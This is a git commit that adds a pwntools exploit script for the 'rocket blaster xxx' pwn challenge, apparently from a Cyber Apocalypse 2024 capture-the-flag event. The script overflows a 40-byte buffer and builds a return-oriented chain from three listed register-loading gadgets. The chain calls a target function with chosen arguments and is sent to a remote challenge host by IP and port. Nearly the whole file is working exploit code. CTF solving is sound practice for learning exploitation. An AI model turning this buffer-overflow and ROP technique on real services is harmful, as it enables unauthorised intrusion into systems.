c745ff5dd9e45a8a6f20399594838b84d6ee89cf
szhan21 <shunda.zhang@intel.com>
2024-03-10 19:27:57 +0800

    solving rocket blaster xxx.

---
+++ CyberApocalypse2024/pwn/pwn_rocket_blaster_xxx/dec.py
@@ -0,0 +1,28 @@
+'''
+cyclic 1024
+gdb-pwndbg ./rocket_blaster_xxx
+cyclic -l jaaa
+
+36+4 == 40
+
+0x000000000040159f : pop rdi ; ret
+0x000000000040159d : pop rsi ; ret
+0x000000000040159b : pop rdx ; ret
+
+'''
+
+from pwn import *
+
+offset = 40
+
+fill_ammo = 0x4012f5
+
+shellcode = offset*b'A'+p64(0x000000000040159f) + p64(0xdeadbeef) + p64(0x000000000040159d) + p64(0xdeadbabe) + p64(0x000000000040159b) + p64(0xdead1337) + p64(fill_ammo)
+
+ip, port = '94.237.53.121', 41229
+io = remote(ip, port)
+#io = process('./rocket_blaster_xxx')
+
+io.recvuntil('>>')
+io.sendline(shellcode)
+print(io.recvall())
